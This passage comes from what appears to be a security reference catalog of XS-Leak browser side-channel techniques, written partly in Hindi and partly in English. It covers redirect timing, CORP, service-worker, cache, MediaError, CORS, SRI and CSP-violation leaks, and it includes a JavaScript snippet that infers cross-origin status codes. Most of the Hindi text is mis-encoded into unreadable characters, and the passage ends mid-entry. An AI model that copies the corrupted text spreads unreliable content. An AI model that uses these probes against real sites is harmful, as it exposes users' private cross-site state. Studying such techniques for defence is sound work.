рд╣рдордиреЗ рдПрдХ XS-Leak рдЙрджрд╛рд╣рд░рдг рдкрд╛рдпрд╛ рдЬреЛ рдХреБрдЫ рдмреНрд░рд╛рдЙрдЬрд╝рд░реЛрдВ рдХреЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдХреНрд░реЙрд╕-рдЙрддреНрд╕рд░реНрдЬрди рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рд╕рд╛рд░реА рдЬрд╛рдирдХрд╛рд░реА рд▓реЙрдЧ рдХрд░рддреЗ рд╣реИрдВред рдорд╛рдирдХ рдПрдХ рд╕рдмрд╕реЗрдЯ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдХреНрд░реЙрд╕-рдЙрддреНрд╕рд░реНрдЬрд┐рдд рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЗ рд▓рд┐рдП рд╢реВрдиреНрдп рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рд╣рд╛рд▓рд╛рдВрдХрд┐, **SA** рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ **рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ** рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВ рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИ, рд▓рдХреНрд╖рд┐рдд рдкреГрд╖реНрда рджреНрд╡рд╛рд░рд╛ **рдкрд░рдлреЙрд░реНрдореЗрдВрд╕ API** рдХрд╛ рдкреВрдЫрддрд╛рдЫ рдХрд░рдХреЗ рдФрд░ **рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рд╕реНрдЯрд╛рд░реНрдЯ рдЯрд╛рдЗрдорд┐рдВрдЧ рдбреЗрдЯрд╛** рдХреА рдЬрд╛рдВрдЪ рдХрд░рдХреЗред

### рдЕрд╡рдзрд┐ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рд▓реАрдХ

* **рд╕рдорд╛рд╡реЗрд╢рди рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдлреЗрдЪ API
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░**: рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **рд╕рд╛рд░рд╛рдВрд╢:** рдЬрдм рдПрдХ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рд╕рдордпрд╛рдВрдХрди рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐рдпреЛрдВ рдХреА рдЕрд╡рдзрд┐ рдирдХрд╛рд░рд╛рддреНрдордХ рд╣реЛрддреА рд╣реИред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

GC рдореЗрдВ, рдЬрд┐рди рдЕрдиреБрд░реЛрдзреЛрдВ рдХреА **рдЕрд╡рдзрд┐** рдПрдХ **рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ** рдореЗрдВ рдкрд░рд┐рдгрд╛рдо рд╣реЛрддреА рд╣реИ, рд╡реЗ **рдирдХрд╛рд░рд╛рддреНрдордХ** рд╣реЛрддреА рд╣реИрдВ рдФрд░ рдЗрд╕рд▓рд┐рдП рдЙрдиреНрд╣реЗрдВ **рдкрд╣рдЪрд╛рдирд╛** рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдореЗрдВ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИрдВред

### CORP рд▓реАрдХ

* **рд╕рдорд╛рд╡реЗрд╢рди рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдлреНрд░реЗрдореНрд╕
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░**: рд╣реЗрдбрд░
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **рд╕рд╛рд░рд╛рдВрд╢:** CORP рджреНрд╡рд╛рд░рд╛ рд╕рдВрд░рдХреНрд╖рд┐рдд рд╕рдВрд╕рд╛рдзрди рд╕рдордпрд╛рдВрдХрди рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐рдпреЛрдВ рдХреЛ рдирд╣реАрдВ рдмрдирд╛рддреЗ рд╣реИрдВред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

рдХреБрдЫ рдорд╛рдорд▓реЛрдВ рдореЗрдВ, **nextHopProtocol рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐** рдХреЛ рдПрдХ рд▓реАрдХ рддрдХрдиреАрдХ рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред GC рдореЗрдВ, рдЬрдм **CORP рд╣реЗрдбрд░** рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ nextHopProtocol рдЦрд╛рд▓реА рд╣реЛ рдЬрд╛рдПрдЧрд╛ред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ SA CORP рд╕рдХреНрд╖рдо рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЗ рд▓рд┐рдП рдХреЛрдИ рднреА рдкреНрд░рджрд░реНрд╢рди рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдирд╣реАрдВ рдмрдирд╛рдПрдЧрд╛ред

### рд╕реЗрд╡рд╛ рдХрд░реНрдордЪрд╛рд░реА

* **рд╕рдорд╛рд╡реЗрд╢рди рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдлреНрд░реЗрдореНрд╕
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░**: API рдЙрдкрдпреЛрдЧ
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Summary:** Detect if a service worker is registered for a specific origin.
* **Code Example**:

Service workers are event-driven script contexts that run at an origin. They run in the background of a web page and can intercept, modify, and **cache resources** to create offline web application.\
If a **resource cached** by a **service worker** is accessed via **iframe**, the resource will be **loaded from the service worker cache**.\
To detect if the resource was **loaded from the service worker** cache the **Performance API** can be used.\
This could also be done with a Timing attack (check the paper for more info).

### Cache

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Timing
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Summary:** It is possible to check if a resource was stored in the cache.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

Using the [Performance API](./#performance-api) it's possible to check if a resource is cached.

### Network Duration

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Summary:** It is possible to retrieve the network duration of a request from the `performance` API.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Error Messages Technique

### Media Error

* **Inclusion Methods**: HTML Elements (Video, Audio)
* **Detectable Difference**: Status Code
* **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Summary:** In Firefox is possible to accurately leak a cross-origin requestтАЩs status code.
* **Code Example**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
`MediaError` рдЗрдВрдЯрд░рдлреЗрд╕ рдХреА message property рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рд╕рд╛рде рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдкрд╣рдЪрд╛рди рдХрд░рддреА рд╣реИред рдПрдХ рд╣рдорд▓рд╛рд╡рд╛рджреА рдЗрд╕ рд╕реБрд╡рд┐рдзрд╛ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдХреЗ рд╕рдВрджреЗрд╢ рд╕рд╛рдордЧреНрд░реА рдХрд╛ рдЕрд╡рд▓реЛрдХрди рдХрд░рдХреЗ, рдПрдХ рдХреНрд░реЙрд╕-рдЙрддреНрд╕рд░реНрдЬрди рд╕рдВрд╕рд╛рдзрди рдХреА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╕реНрдерд┐рддрд┐ рдХрд╛ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛ рд╕рдХрддрд╛ рд╣реИред

### CORS рддреНрд░реБрдЯрд┐

* **рд╕рдорд╛рд╡реЗрд╢рди рд╡рд┐рдзрд┐рдпрд╛рдБ**: Fetch API
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░**: рд╣реЗрдбрд░
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **рд╕рд╛рд░рд╛рдВрд╢:** рд╕реБрд░рдХреНрд╖рд╛ рдЖрджрд╛рдиреЛрдВ (SA) рдореЗрдВ, CORS рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдЕрдирдЬрд╛рдиреЗ рдореЗрдВ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рдкреВрд░реНрдг URL рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рддреЗ рд╣реИрдВред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

рдпрд╣ рддрдХрдиреАрдХ рдПрдХ рд╣рдорд▓рд╛рд╡рд╛рджреА рдХреЛ **рдХреНрд░реЙрд╕-рдЙрддреНрд╕рд░реНрдЬрди рд╕рд╛рдЗрдЯ рдХреЗ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рдХреЗ рдЧрдВрддрд╡реНрдп** рдХреЛ рдЙрдЪрд┐рдд рдХреИрд╕реЗ рд╢реЛрдзрддреЗ рд╣реИрдВ, рдЗрд╕рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ рдХрд┐ рд╡реЗрдмрдХрд┐рдЯ-рдЖрдзрд╛рд░рд┐рдд рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЙрд░реНрд╕ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдХреИрд╕реЗ рд╕рдВрднрд╛рд▓рддреЗ рд╣реИрдВред рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ, рдЬрдм рдПрдХ **CORS рд╕рдХреНрд╖рдо рдЕрдиреБрд░реЛрдз** рдПрдХ рд▓рдХреНрд╖реНрдп рд╕рд╛рдЗрдЯ рдХреЛ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реНрдерд┐рддрд┐ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рдЬрд╛рд░реА рдХрд░рддрд╛ рд╣реИ рдФрд░ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдЙрд╕ рдЕрдиреБрд░реЛрдз рдХреЛ рдирдХрд╛рд░рддрд╛ рд╣реИ, рддреЛ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдХреЗ рдЕрдВрджрд░ **рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЧрдВрддрд╡реНрдп рдХрд╛ рдкреВрд░рд╛ URL** рдЙрдЬрд╛рдЧрд░ рд╣реЛрддрд╛ рд╣реИред рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рди рдХреЗрд╡рд▓ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢ рдХреЗ рд╡рд╛рд╕реНрддрд╡рд┐рдХрддрд╛ рдХреЛ рдкреНрд░рдХрдЯ рдХрд░рддрд╛ рд╣реИ рдмрд▓реНрдХрд┐ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢ рдХреЗ рдЕрдВрдд рдмрд┐рдВрджреБ рдФрд░ рдХрд┐рд╕реА рднреА **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдХреНрд╡реЗрд░реА рдкреИрд░рд╛рдореАрдЯрд░** рдХреЛ рднреА рдЙрдЬрд╛рдЧрд░ рдХрд░рддрд╛ рд╣реИред

### SRI рддреНрд░реБрдЯрд┐

* **рд╕рдорд╛рд╡реЗрд╢рди рд╡рд┐рдзрд┐рдпрд╛рдБ**: Fetch API
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░**: рд╣реЗрдбрд░
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **рд╕рд╛рд░рд╛рдВрд╢:** рд╕реБрд░рдХреНрд╖рд╛ рдЕрднрд┐рд╡рд╛рджрдиреЛрдВ (SA) рдореЗрдВ, CORS рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдЕрдирдЬрд╛рдиреЗ рдореЗрдВ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЕрдиреБрд░реЛрдзреЛрдВ рдХрд╛ рдкреВрд░рд╛ URL рдЙрдЬрд╛рдЧрд░ рдХрд░рддреЗ рд╣реИрдВред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

рдПрдХ рд╣рдорд▓рд╛рд╡рд╛рд░ **рд╡рд┐рд╕реНрддреГрдд рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢** рдХрд╛ рд╢реЛрдзрдХ рдкрд╛рд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдкрд╛рд░рдХ-рд╕реНрдерд╛рдирд┐рдХ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдУрдВ рдХрд╛ рдЖрдХрд╛рд░ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ Subresource Integrity (SRI) рдХреА рддрдВрддреНрд░рд┐рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреА рд╣реИ, рдЬреЛ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рддреА рд╣реИ рдХрд┐ рд╕рдВрд╕рд╛рдзрди рдЬрд┐рдиреНрд╣реЗрдВ рдлреЗрдЪ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЕрдХреНрд╕рд░ CDNs рд╕реЗ, рдореЗрдВ рдЦрд┐рд╕рдХ рдЧрдП рдирд╣реАрдВ рд╣реИрдВред SRI рдХреЛ рдкрд╛рд░рдХ-рд╕реНрдерд╛рдирд┐рдХ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдкрд░ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЗрдиреНрд╣реЗрдВ **CORS рд╕рдХреНрд╖рдо** рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП; рдЕрдиреНрдпрдерд╛, рдЗрдиреНрд╣реЗрдВ рдЕрдЦрдВрдбрддрд╛ рдЬрд╛рдВрдЪреЛрдВ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╖рдп рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рд╕реБрд░рдХреНрд╖рд╛ рдЕрднрд┐рд╡рд╛рджрдиреЛрдВ (SA) рдореЗрдВ, CORS рддреНрд░реБрдЯрд┐ XS-Leak рдХреА рддрд░рд╣, рдПрдХ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдХреЛ рдПрдХ рдлреЗрдЪ рдЕрдиреБрд░реЛрдз рдХреЗ рдмрд╛рдж рдХреИрдкреНрдЪрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрдм рдПрдХ рдЕрдЦрдВрдбрддрд╛ рд╡рд┐рд╢реЗрд╖рддрд╛ рд╡рд╛рд▓рд╛ рдЕрдиреБрд░реЛрдз рдЕрд╕рдлрд▓ рд╣реЛрддрд╛ рд╣реИред рд╣рдорд▓рд╛рд╡рд╛рд░ рдЬрд╛рдирдмреВрдЭрдХрд░ **рдЗрд╕ рддреНрд░реБрдЯрд┐ рдХреЛ рдЯреНрд░рд┐рдЧрд░** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ рдХрд┐рд╕реА рднреА рдЕрдиреБрд░реЛрдз рдХреА рдЕрдЦрдВрдбрддрд╛ рд╡рд┐рд╢реЗрд╖рддрд╛ рдореЗрдВ рдПрдХ **рдмреЛрдЧрд╕ рд╣реИрд╢ рдорд╛рди** рджреЗрдиреЗ рдХреЗ рджреНрд╡рд╛рд░рд╛ред SA рдореЗрдВ, рдкрд░рд┐рдгрд╛рдореА рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдЕрдирдЬрд╛рдиреЗ рдореЗрдВ рдЕрдиреБрд░реЛрдзрд┐рдд рд╕рдВрд╕рд╛рдзрди рдХреА рд╕рд╛рдордЧреНрд░реА рд▓рдВрдмрд╛рдИ рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдЬрд╛рдирдХрд╛рд░реА рд▓реАрдХреЗрдЬ рдПрдХ рд╣рдорд▓рд╛рд╡рд╛рд░ рдХреЛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ рдЖрдХрд╛рд░ рдореЗрдВ рднрд┐рдиреНрдирддрд╛рдПрдБ рд╡рд┐рдЪрд╛рд░ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдЬреЛ рд╡рд┐рд╡рд┐рдз XS-Leak рд╣рдорд▓реЛрдВ рдХреЗ рд▓рд┐рдП рдорд╛рд░реНрдЧ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рддреА рд╣реИред

### CSP рдЙрд▓реНрд▓рдВрдШрди/рдкрддрд╛ рд▓рдЧрд╛рдирд╛

* **рд╕рдорд╛рд╡реЗрд╢ рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдкреЙрдк-рдЕрдкреНрд╕
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рднрд┐рдиреНрдирддрд╛**: рд╕реНрдерд┐рддрд┐ рдХреЛрдб
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **рд╕рд╛рд░рд╛рдВрд╢:** рдХреЗрд╡рд▓ рдкреАрдбрд╝рд┐рдд рд╡реЗрдмрд╕рд╛рдЗрдЯ рдХреЛ CSP рдореЗрдВ рдЕрдиреБрдорддрд┐ рджреЗрдирд╛ рдпрджрд┐ рд╣рдо рдЗрд╕реЗ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдпрд╣ рдПрдХ рд╡рд┐рднрд┐рдиреНрди рдбреЛрдореЗрди рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рд╣реЛрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИ рддреЛ CSP рдПрдХ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рддреНрд░реБрдЯрд┐ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдЧрд╛ред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

рдПрдХ XS-Leak CSP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХреЗ рдХрд┐ рдХреНрдпрд╛ рдПрдХ рдкрд╛рд░рдХ-рд╕реНрдерд╛рдирд┐рдХ рд╕рд╛рдЗрдЯ рдХреЛ рдПрдХ рд╡рд┐рднрд┐рдиреНрди рдореВрд▓ рдореЗрдВ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред рдпрд╣ рд▓реАрдХ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХреЛ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рд▓рдХреНрд╖реНрдп рдХрд╛ рдбреЛрдореЗрди рднреА рд▓реАрдХ рд╣реЛрддрд╛ рд╣реИред рдЗрд╕ рд╣рдорд▓реЗ рдХреА рдореВрд▓ рд╡рд┐рдЪрд╛рд░ рдпрд╣ рд╣реИ рдХрд┐ **рд╣рдорд▓рд╛рд╡рд╛рд░ рд╕рд╛рдЗрдЯ рдкрд░ рд▓рдХреНрд╖рд┐рдд рдбреЛрдореЗрди рдХреЛ рдЕрдиреБрдорддрд┐ рджреЗрдВ**ред рдПрдХ рдмрд╛рд░ рдЬрдм рд▓рдХреНрд╖рд┐рдд рдбреЛрдореЗрди рдХреЛ рдПрдХ рдЕрдиреБрд░реЛрдз рдЬрд╛рд░реА рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдпрд╣ **рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд** рд╣реЛрддрд╛ рд╣реИ рдПрдХ рдкрд╛рд░рдХ-рд╕реНрдерд╛рдирд┐рдХ рдбреЛрдореЗрди рдкрд░ред **CSP рдЙрд╕рдХрд╛ рдкрд╣реБрдВрдЪ рдмреНрд▓реЙрдХ** рдХрд░рддрд╛ рд╣реИ рдФрд░ рдПрдХ **рдЙрд▓реНрд▓рдВрдШрди рд░рд┐рдкреЛрд░реНрдЯ рдЬреЛ рдПрдХ рд▓реАрдХ рддрдХрдиреАрдХ рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ** рдмрдирд╛рддрд╛ рд╣реИред рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЗ рдЖрдзрд╛рд░ рдкрд░, **рдпрд╣ рд░рд┐рдкреЛрд░реНрдЯ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢ рдХреЗ рд▓рдХреНрд╖рд┐рдд рд╕реНрдерд╛рди рдХреЛ рд▓реАрдХ рдХрд░ рд╕рдХрддреА рд╣реИ**ред\
рдЖрдзреБрдирд┐рдХ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдпрд╣ рдирд╣реАрдВ рджрд┐рдЦрд╛рдПрдВрдЧреЗ рдХрд┐ рдЙрд╕реЗ рдХрд┐рд╕ URL рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рд▓реЗрдХрд┐рди рдЖрдк рдлрд┐рд░ рднреА рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдПрдХ рдкрд╛рд░рдХ-рд╕реНрдерд╛рдирд┐рдХ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред
### рдХреИрд╢

* **рд╕рдорд╛рд╡реЗрд╢рди рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдлреНрд░реЗрдо, рдкреЙрдк-рдЕрдк
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдореЗрдВ рдЕрдВрддрд░**: рдкреГрд╖реНрда рд╕рд╛рдордЧреНрд░реА
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **рд╕рд╛рд░рд╛рдВрд╢:** рдХреИрд╢ рд╕реЗ рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рд╛рдлрд╝ рдХрд░реЗрдВред рд▓рдХреНрд╖рд┐рдд рдкреГрд╖реНрда рдХреЛ рдЦреЛрдЬрддрд╛ рд╣реИ рдФрд░ рджреЗрдЦрддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдлрд╝рд╛рдЗрд▓ рдХреИрд╢ рдореЗрдВ рдореМрдЬреВрдж рд╣реИред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг:**

